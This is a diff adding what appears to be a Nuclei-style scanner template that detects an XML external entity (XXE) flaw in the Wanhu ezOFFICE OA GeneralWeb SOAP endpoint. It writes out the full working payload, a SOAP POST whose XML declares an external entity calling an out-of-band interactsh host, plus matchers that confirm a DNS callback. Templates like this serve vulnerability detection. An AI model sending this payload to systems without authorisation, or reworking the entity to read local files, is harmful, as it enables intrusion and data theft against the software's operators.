@@ -1,0 +1,42 @@
+id: poc-yaml-wanhu-ezoffice-generalweb-xxe
+info:
+  name: Wanhu OA GeneralWeb XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+  description: |
+    Wanhu OA system interface GeneralWeb is vulnerable to XML External Entity (XXE) attacks.
+http:
+  - method: POST
+    path:
+      - /defaultroot/xfservices/./GeneralWeb
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+      SOAPAction: ""
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
+        <soapenv:Body>
+          <gen:OAManager>
+            <gen:input>
+              <?xml version="1.0" encoding="UTF-8"?>
+              <!DOCTYPE root [
+              <!ENTITY x SYSTEM "http://{{interactsh-url}}/">]>
+              <root>&x;</root>
+            </gen:input>
+          </gen:OAManager>
+        </soapenv:Body>
+      </soapenv:Envelope>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "<faultstring>"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
